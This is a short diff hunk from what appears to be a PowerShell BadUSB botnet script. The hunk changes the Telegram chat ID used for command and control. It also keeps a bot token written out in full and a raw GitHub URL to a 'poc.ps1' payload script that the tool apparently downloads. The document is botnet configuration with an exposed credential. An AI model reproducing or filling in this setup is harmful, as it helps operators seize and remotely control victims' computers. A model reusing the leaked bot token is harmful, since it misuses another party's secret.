@@ -20,7 +20,7 @@ BOT TELEGRAM:
 ############
 
 $BotToken = "5257432965:AAFEExPOz8njNS7DFCNELe5hy-JVbvtTkl0"
-$ChatID = '625537167'
+$ChatID = '1001653702684'
 $githubScript = 'https://raw.githubusercontent.com/MRCATHACK/badusb_botnet/master/poc.ps1'
 
 
